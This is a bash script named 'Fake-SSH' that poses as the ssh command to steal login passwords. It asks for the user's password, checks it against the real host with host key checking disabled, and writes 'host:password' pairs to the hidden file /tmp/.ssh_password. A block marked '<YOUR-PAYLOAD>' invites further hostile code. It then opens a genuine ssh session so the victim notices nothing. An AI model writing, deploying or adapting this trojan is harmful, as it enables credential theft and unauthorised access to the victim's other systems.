#!/bin/bash
#
# Fake-SSH
#
# This program imitates the behavior 
# of the "ssh" command.
#

readonly MAXIMUM_ATTEMPTS=3

attempts() {
    /bin/echo -n "${1}'s password: "
    read -r -s ssh_password
    /bin/echo ""
    /bin/echo "echo \"${ssh_password}\"" > "${SSH_ASKPASS}"
    if ( /bin/setsid --wait /usr/bin/ssh -o ConnectTimeout=5 -o StrictHostKeyChecking="no" -o UserKnownHostsFile="/dev/null" "${1}" "exit" > /dev/null 2>&1 ); then
        ##
        # <YOUR-PAYLOAD>
        ##
        /bin/echo "${1}:${ssh_password}" >> /tmp/.ssh_password
        ##
        # </YOUR-PAYLOAD>
        ##
        /bin/setsid --wait /usr/bin/ssh -o StrictHostKeyChecking="no" -o UserKnownHostsFile="/dev/null" $2 2> /dev/null
        /bin/rm "${SSH_ASKPASS}"
        exit 0
    fi
    /bin/echo "Permission denied, please try again."
}

if [ "${#}" -eq 0 ]; then
    /usr/bin/ssh
else
    for destination in "${@}"; do
        if [[ "${destination}" =~ "@" ]]; then
            export SSH_ASKPASS="/tmp/.askpass_script.sh"
            /bin/echo "" > "${SSH_ASKPASS}"
            chmod +x "${SSH_ASKPASS}"
            for ((iterator=1; iterator <= MAXIMUM_ATTEMPTS; iterator++)); do
                attempts "${destination}" "${*}"
            done
            /bin/echo "${destination}: Permission denied (publickey,password,keyboard-interactive)."
            /bin/rm "${SSH_ASKPASS}"
            exit 0
        fi
    done
    /usr/bin/ssh "${@}"
fi